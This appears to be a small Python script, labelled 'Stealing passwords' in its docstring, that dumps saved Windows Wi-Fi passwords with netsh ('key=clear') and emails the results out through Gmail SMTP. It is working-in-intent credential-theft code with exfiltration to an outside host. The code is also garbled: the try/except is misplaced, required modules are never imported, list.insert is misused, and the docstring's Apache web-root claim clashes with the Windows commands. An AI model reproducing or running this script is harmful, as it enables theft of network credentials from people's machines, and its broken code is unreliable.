import subprocess, smtplib, re

"""
Stealing passwords
Lives in /var/www/html for the apache2 web server
"""

def PrintException():
		exc_type, exc_obj, tb = sys.exc_info()
		f = tb.tb_frame
		lineno = tb.tb_lineno
		filename = f.f_code.co_filename
		linecache.checkcache(filename)
		line = linecache.getline(filename, lineno, f.f_globals)
		if args:
			print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ problem here ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
			print(args)
		print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587) # create instance of smtp server
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message) #from, to, message
	server.quit()

def get_pass():
	try:
		#windows example, be sure to check if commands are 32 and 64 bit compatible
		command = "netsh wlan show profile"
		networks = subprocess.check_output(command, shell=True)
		network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) # groups, group(1), findall makes multiple matches, in list form
		result  = []

		for network_name in network_names_list:
			network_pass_command  = "netsh wlan show profile " + network_name + " key=clear"
			current_result = subprocess.check_output(network_pass_command, shell=True)
			result.insert(current_result)
		except:
			PrintException()
	return result

result = get_pass()
send_mail("example@gmail.com", "pass", result)
